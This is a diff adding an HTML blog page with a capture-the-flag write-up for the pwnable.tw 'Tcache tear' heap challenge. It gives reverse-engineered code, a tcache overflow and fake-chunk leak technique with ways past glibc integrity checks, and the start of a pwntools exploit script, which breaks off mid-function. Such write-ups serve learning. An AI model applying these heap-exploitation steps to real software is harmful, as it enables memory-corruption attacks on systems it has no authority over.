@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Tcache tear (200 pts) - pwnable.tw | NguyenDD&#39;s Blog</title>
+<meta name="keywords" content="pwnable.tw">
+<meta name="description" content="
+ 0x1. Initial Reconnaissance 
+file
+↪ file tcache_tear
+tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped
+checksec
+↪ checksec --file=tcache_tear
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	Partial	1		2		tcache_tear
+./tcache_tear
+Name:YourName
+$$$$$$$$$$$$$$$$$$$$$$$
+      Tcache tear     
+$$$$$$$$$$$$$$$$$$$$$$$
+  1. Malloc            
+  2. Free              
+  3. Info              
+  4. Exit              
+$$$$$$$$$$$$$$$$$$$$$$$
+Your choice :
+
+0x2. Reverse Engineering
+main
+void __fastcall __noreturn main(int a1, char **a2, char **a3)
+{
+  __int64 v3; // rax
+  unsigned int v4; // [rsp&#43;Ch] [rbp-4h]
+
+  sub_400948();
+  printf(&#34;Name:&#34;);
+  sub_400A25((__int64)&amp;unk_602060, 0x20u);
+  v4 = 0;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      sub_400A9C();
+      v3 = sub_4009C4();
+      if ( v3 != 2 )
+        break;
+      if ( v4 &lt;= 7 )
+      {
+        free(ptr);
+        &#43;&#43;v4;
+      }
+    }
+    if ( v3 &gt; 2 )
+    {
+      if ( v3 == 3 )
+      {
+        sub_400B99();
+      }
+      else
+      {
+        if ( v3 == 4 )
+          exit(0);
+LABEL_14:
+        puts(&#34;Invalid choice&#34;);
+      }
+    }
+    else
+    {
+      if ( v3 != 1 )
+        goto LABEL_14;
+      sub_400B14();
+    }
+  }
+}
+Allocate
+int sub_400B14()
+{
+  unsigned __int64 v0; // rax
+  int size; // [rsp&#43;8h] [rbp-8h]
+
+  printf(&#34;Size:&#34;);
+  v0 = sub_4009C4();
+  size = v0;
+  if ( v0 &lt;= 0xFF )
+  {
+    ptr = malloc(v0);
+    printf(&#34;Data:&#34;);
+    sub_400A25((__int64)ptr, size - 16);
+    LODWORD(v0) = puts(&#34;Done !&#34;);
+  }
+  return v0;
+}
+read_function
+_BYTE *__fastcall sub_400A25(__int64 a1, unsigned int a2)
+{
+  _BYTE *result; // rax
+  int chk; // [rsp&#43;1Ch] [rbp-4h]
+
+  chk = __read_chk(0LL, a1, a2, a2);
+  if ( chk &lt;= 0 )
+  {
+    puts(&#34;read error&#34;);
+    _exit(1);
+  }
+  result = (_BYTE *)*(unsigned __int8 *)(chk - 1LL &#43; a1);
+  if ( (_BYTE)result == 10 )
+  {
+    result = (_BYTE *)(chk - 1LL &#43; a1);
+    *result = 0;
+  }
+  return result;
+}
+Info
+ssize_t sub_400B99()
+{
+  printf(&#34;Name :&#34;);
+  return write(1, &amp;unk_602060, 0x20uLL);
+}
+
+0x3. Analysis
+First, you can write your name (up to 32 bytes) to name variable in bss (at 0x602060). You can also print out what&rsquo;s in this variable with info option. They allow us to malloc a chunk of our desired size (as long as smaller than 0xff) and input our size-16 to these chunk, then store the address to ptr variable (at 0x602088). Free option enables us to free chunk stored at ptr variable but not reset it.">
+<meta name="author" content="">
+<link rel="canonical" href="//localhost:1313/blogs/tcache_tear/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/blogs/tcache_tear/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="NguyenDD&#39;s Blog (Alt + H)">NguyenDD&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/blogs" title="Blogs">
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Tcache tear (200 pts) - pwnable.tw
+    </h1>
+    <div class="post-meta"><span title='2025-08-29 09:53:43 +0700 +07'>August 29, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><hr>
+<h2 id="0x1-initial-reconnaissance"><!-- raw HTML omitted --> 0x1. Initial Reconnaissance <!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x1-initial-reconnaissance">#</a></h2>
+<h3 id="file">file<a hidden class="anchor" aria-hidden="true" href="#file">#</a></h3>
+<pre tabindex="0"><code>↪ file tcache_tear
+tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a273b72984b37439fd6e9a64e86d1c2131948f32, stripped
+</code></pre><h3 id="checksec">checksec<a hidden class="anchor" aria-hidden="true" href="#checksec">#</a></h3>
+<pre tabindex="0"><code>↪ checksec --file=tcache_tear
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	Partial	1		2		tcache_tear
+</code></pre><h3 id="tcache_tear">./tcache_tear<a hidden class="anchor" aria-hidden="true" href="#tcache_tear">#</a></h3>
+<pre tabindex="0"><code>Name:YourName
+$$$$$$$$$$$$$$$$$$$$$$$
+      Tcache tear     
+$$$$$$$$$$$$$$$$$$$$$$$
+  1. Malloc            
+  2. Free              
+  3. Info              
+  4. Exit              
+$$$$$$$$$$$$$$$$$$$$$$$
+Your choice :
+</code></pre><hr>
+<h2 id="0x2-reverse-engineering"><!-- raw HTML omitted -->0x2. Reverse Engineering<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x2-reverse-engineering">#</a></h2>
+<h3 id="main">main<a hidden class="anchor" aria-hidden="true" href="#main">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_400948</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name:&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_400A25</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_602060, <span style="color:#ae81ff">0x20u</span>);
+</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_400A9C</span>();
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_4009C4</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">7</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(ptr);
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>v4;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_400B99</span>();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>LABEL_14:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid choice&#34;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_14;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_400B14</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="allocate">Allocate<a hidden class="anchor" aria-hidden="true" href="#allocate">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_400B14</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v0; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> size; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Size:&#34;</span>);
+</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_4009C4</span>();
+</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> v0;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v0 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFF</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(v0);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Data:&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_400A25</span>((<span style="color:#66d9ef">__int64</span>)ptr, size <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LODWORD</span>(v0) <span style="color:#f92672">=</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Done !&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="read_function">read_function<a hidden class="anchor" aria-hidden="true" href="#read_function">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BYTE <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_400A25</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _BYTE <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> chk; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  chk <span style="color:#f92672">=</span> <span style="color:#a6e22e">__read_chk</span>(<span style="color:#ae81ff">0LL</span>, a1, a2, a2);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( chk <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;read error&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> <span style="color:#f92672">*</span>)(chk <span style="color:#f92672">-</span> <span style="color:#ae81ff">1LL</span> <span style="color:#f92672">+</span> a1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (_BYTE)result <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)(chk <span style="color:#f92672">-</span> <span style="color:#ae81ff">1LL</span> <span style="color:#f92672">+</span> a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="info">Info<a hidden class="anchor" aria-hidden="true" href="#info">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">sub_400B99</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Name :&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>unk_602060, <span style="color:#ae81ff">0x20uLL</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="0x3-analysis"><!-- raw HTML omitted -->0x3. Analysis<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x3-analysis">#</a></h2>
+<p>First, you can write your name (up to 32 bytes) to name variable in bss (at 0x602060). You can also print out what&rsquo;s in this variable with info option. They allow us to malloc a chunk of our desired size (as long as smaller than 0xff) and input our size-16 to these chunk, then store the address to ptr variable (at 0x602088). Free option enables us to free chunk stored at ptr variable but not reset it.</p>
+<hr>
+<h2 id="0x3-exploit"><!-- raw HTML omitted -->0x3. Exploit<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#0x3-exploit">#</a></h2>
+<p>If you allocate a chunk of 15 bytes, the program mistakenly lets you input -1 bytes into it — which actually means you can write up to 0xff bytes. Using this, you can create two chunks, with the first one being 15 bytes. After freeing both chunks, allocate another 15-byte chunk to reclaim the first one. Since you can now write 0xff bytes into it, you can overflow into the second chunk and overwrite its fd pointer, paving the way for exploitation.
+Because you can print value at name variable, so what will happen if you make this variable become a fake chunk ?
+If you forge the size of this fake chunk to greater than 0x411 then free it, they will put your fake chunk into large bins or unsorted bin. This means you can get the address of main arena through info option.
+But when you try to exploit, you could encounter 2 errors below:</p>
+<h4 id="double-free-or-corruption-prev">&ldquo;double free or corruption (!prev)&rdquo;<a hidden class="anchor" aria-hidden="true" href="#double-free-or-corruption-prev">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">prev_inuse</span>(nextchunk)))
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">malloc_printerr</span> (<span style="color:#e6db74">&#34;double free or corruption (!prev)&#34;</span>);
+</span></span></code></pre></div><p>They check whether the next chunk does have prev_inuse bit on or not. But you create a fake chunk in bss, you have no next chunk. To bypass, just need to create another chunk right after your fake chunk.</p>
+<h4 id="corrupted-size-vs-prev_size">&ldquo;corrupted size vs. prev_size&rdquo;<a hidden class="anchor" aria-hidden="true" href="#corrupted-size-vs-prev_size">#</a></h4>
+<p>If you free a large chunk (exceeds the fastbins and tcache range), lets call chunk A, they will check whether the next chunk (chunk B) is the top chunk or not. If chunk B isn&rsquo;t the top chunk, they continue to validate whether chunk B is freed or not by checking the prev_inuse flag in the next chunk of chunk B. If chunk B is freed, they merge chunk B into chunk A.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define unlink(AV, P, BK, FD) {                                            \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      malloc_printerr (&#34;corrupted size vs. prev_size&#34;);		
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ...
+</span></span><span style="display:flex;"><span>    ...   
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_int_free</span> (....){
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (nextchunk <span style="color:#f92672">!=</span> av<span style="color:#f92672">-&gt;</span>top) {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* get and clear inuse bit */</span>
+</span></span><span style="display:flex;"><span>      nextinuse <span style="color:#f92672">=</span> <span style="color:#a6e22e">inuse_bit_at_offset</span>(nextchunk, nextsize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* consolidate forward */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>nextinuse) {
+</span></span><span style="display:flex;"><span>	        <span style="color:#a6e22e">unlink</span>(av, nextchunk, bck, fwd);
+</span></span><span style="display:flex;"><span>	        size <span style="color:#f92672">+=</span> nextsize;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    	    <span style="color:#a6e22e">clear_inuse_bit_at_offset</span>(nextchunk, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To bypass this errror, create 2 fake chunks right after your fake chunk at name variable.</p>
+<p>After getting the address of main arena, when I try to create a chunk of 15 bytes, they return me the address of my fake chunk that I just freed. To handle that, I prepared 2 chunks and put them into tcache before freeing my fake chunk.</p>
+<h6 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./tcache_tear_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># r = gdb.debug ([exe.path], &#34;b *0x400BC7&#34;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10207</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allocate</span> (p, size, data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size:&#39;</span>, size)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data:&#39;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span> (p):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">info</span> (p):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602060</span>
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602088</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Name:&#39;</span>, p64 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64 (<span style="color:#ae81ff">0x501</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;15&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>    allocate (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;81&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>)
+</span></span><span style="display:flex;"><span>    free(p)
+</span></span><span style="display:flex;"><span>
